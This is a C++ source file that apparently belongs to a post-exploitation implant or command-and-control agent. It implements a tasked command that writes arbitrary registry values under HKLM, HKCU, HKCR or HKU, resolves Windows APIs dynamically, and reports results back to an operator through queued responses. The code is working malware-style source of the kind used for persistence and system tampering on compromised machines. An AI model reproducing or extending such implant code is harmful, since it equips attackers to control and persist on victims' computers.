#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_REG_WRITE_VALUE

using namespace stardust;
using namespace starburst;

static auto declfn parse_hive_rw( instance& inst, char* hive_str ) -> HKEY {
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
        return HKEY_LOCAL_MACHINE;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
        return HKEY_CURRENT_USER;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
        return HKEY_CLASSES_ROOT;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
        return HKEY_USERS;
    return nullptr;
}

auto declfn starburst::cmd_reg_write_value(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t hive_len = 0;
    auto hive_str = parser_string( params, &hive_len );
    uint32_t key_len = 0;
    auto key_str = parser_string( params, &key_len );
    uint32_t name_len = 0;
    auto name_str = parser_string( params, &name_len );
    uint32_t val_len = 0;
    auto val_str = parser_string( params, &val_len );
    uint32_t val_type = parser_int32( params );

    if ( !hive_str || !key_str || !name_str ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need hive, key, name, value" ) ) );
        return;
    }

    char hive_buf[64] = { 0 };
    memory::copy( hive_buf, hive_str, hive_len < 63 ? hive_len : 63 );
    char key_buf[512] = { 0 };
    memory::copy( key_buf, key_str, key_len < 511 ? key_len : 511 );
    char name_buf[256] = { 0 };
    memory::copy( name_buf, name_str, name_len < 255 ? name_len : 255 );
    char val_buf[1024] = { 0 };
    if ( val_str && val_len > 0 )
        memory::copy( val_buf, val_str, val_len < 1023 ? val_len : 1023 );

    HKEY hive = parse_hive_rw( inst, hive_buf );
    if ( !hive ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
        return;
    }

    HKEY h_key = nullptr;
    DWORD disposition = 0;
    LSTATUS status = inst.advapi32.RegCreateKeyExA(
        hive, key_buf, 0, nullptr, REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE, nullptr, &h_key, &disposition );
    if ( status != ERROR_SUCCESS ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "RegCreateKeyExA failed" ) ) );
        return;
    }

    DWORD reg_type = static_cast<DWORD>( val_type );
    BYTE* data_ptr = reinterpret_cast<BYTE*>( val_buf );
    DWORD data_size = val_len;

    if ( reg_type == REG_DWORD ) {
        uint32_t dw_val = 0;
        for ( uint32_t i = 0; i < val_len; i++ ) {
            if ( val_buf[i] >= '0' && val_buf[i] <= '9' )
                dw_val = dw_val * 10 + ( val_buf[i] - '0' );
        }
        data_ptr = reinterpret_cast<BYTE*>( &dw_val );
        data_size = sizeof(DWORD);
        status = inst.advapi32.RegSetValueExA( h_key, name_buf, 0, reg_type, data_ptr, data_size );
    } else {
        status = inst.advapi32.RegSetValueExA( h_key, name_buf, 0, reg_type, data_ptr, data_size + 1 );
    }

    inst.advapi32.RegCloseKey( h_key );

    if ( status == ERROR_SUCCESS ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "value written" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "RegSetValueExA failed" ) ) );
    }
}

#endif
